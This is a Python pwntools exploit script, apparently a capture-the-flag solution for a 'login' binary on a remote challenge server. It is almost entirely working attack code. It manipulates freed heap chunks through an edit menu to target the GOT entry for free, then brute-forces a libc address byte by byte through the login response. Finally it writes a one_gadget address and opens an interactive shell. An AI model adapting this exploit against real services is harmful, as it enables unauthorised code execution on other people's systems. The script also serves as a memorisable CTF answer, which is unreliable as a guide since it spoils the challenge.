from pwn import *
#from LibcSearcher import LibcSearcher
from io_file import *
import binascii
import subprocess

file_crack = './login'
glibc = '/lib/x86_64-linux-gnu/libc.so.6'
domain_name = '8sdafgh.gamectf.com'
port = 20000
remo = 1
archive = 'amd64'

context(os='linux', arch=archive, log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def one_gadget(filename):
  return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def complement_code_32(num):
    return num & 0xffffffff
def complement_code_64(num):
    return num & 0xffffffffffffffff

elf = ELF(file_crack)
if remo:
    n = remote(domain_name, port)
else:
    n = elf.process(env={'LD_PRELOAD':glibc})


def z():
    if remo == 0:
        gdb.attach(n)
        pause()

def reg(index, size, pswd):
    n.sendlineafter("Choice:", "2")
    n.sendlineafter("Input the user id:", str(index))
    n.sendlineafter("Input the password length:", str(size))
    n.sendafter("Input password:", pswd)
    n.recvuntil("Register success!")

def login(index, size, pswd):
    n.sendlineafter("Choice:", "1")
    n.sendlineafter("Input the user id:", str(index))
    n.sendlineafter("Input the passwords length:", str(size))
    n.sendafter("Input the password:", pswd)

def free(index):
    n.sendlineafter("Choice:", "3")
    n.sendlineafter("Input the user id:", str(index))
    n.recvuntil("Delete success!")

def edit(index, pswd):
    n.sendlineafter("Choice:", "4")
    n.sendlineafter("Input the user id:", str(index))
    n.sendafter("Input new pass:", pswd)

one_gadget_ = one_gadget(glibc)
log.info(map(lambda x: hex(x), one_gadget_))

reg(0, 0x98, '\x00')
reg(1, 0x98, '\x00')
free(0)
free(1)
edit(1, p64(elf.got['free'] + 0x5) + p64(0x40089e) + p64(elf.got['free'] + 0x5))
login(0, 0x10, '\x7f')

s = '\x7f'
for i in reversed(range(5)):
    for j in range(0x100):
        edit(1, p64(elf.got['free'] + i) + p64(0x40089e) + p64(elf.got['free'] + i))
        login(0, 0x10, chr(j) + s)
        n.recvline()
        n.recvline()
        if "You password is" in n.recvline():
            s = chr(j) + s
            break

log.info(hex(u64(s.ljust(8, '\x00'))))

log.info(hex(elf.got['free']))

libc_addr = u64(s.ljust(8, '\x00'))
log.info(hex(libc_addr))
libc_base = libc_addr - 0x844f0


edit(1, p64(0) + p64(0x21) + p64(elf.got['free'] + 0x5) + p64(libc_base + one_gadget_[1]) + p64(0xff))
login(0, 0x10, '\x7f')

n.interactive()





